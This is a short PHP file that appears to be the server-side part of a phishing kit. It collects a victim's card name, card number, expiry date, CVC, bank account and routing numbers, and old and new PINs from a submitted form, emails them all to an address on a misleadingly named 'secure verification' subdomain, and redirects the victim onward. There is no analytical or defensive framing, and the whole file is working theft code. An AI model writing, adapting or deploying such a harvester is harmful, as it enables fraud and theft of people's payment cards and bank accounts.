<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_name = htmlspecialchars($_POST['card_name']);
    $card_number = htmlspecialchars($_POST['card_number']);
    $expiry_date = htmlspecialchars($_POST['expiry_date']);
    $cvc = htmlspecialchars($_POST['cvc']);
    $account_number = htmlspecialchars($_POST['account_number']);
    $routine_number = htmlspecialchars($_POST['routine_number']);
    $old_pin = htmlspecialchars($_POST['old_pin']);
    $new_pin = htmlspecialchars($_POST['new_pin']);
    
    $to = 'marketing@bestinallsecureverygoodverificationboostconfidentinall.hannahjonesjewels.com'; // Replace with your admin email
    $subject = "p r";
    $message = "Card name: $card_name\nCard Number: $card_number\nExpiry Date: $expiry_date\nCVC: $cvc\nAccount Number: $account_number\nRoutine Number: $routine_number\nOld Pin: $old_pin\nNew Pin: $new_pin";
    $headers = "From: marketing@bestinallsecureverygoodverificationboostconfidentinall.hannahjonesjewels.com"; // Replace with your from email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to another page
        header("Location: enterscstu.html");
        exit();
    } else {
        echo "There was an error sending the email.";
    }
} else {
    echo "Invalid request.";
}
?>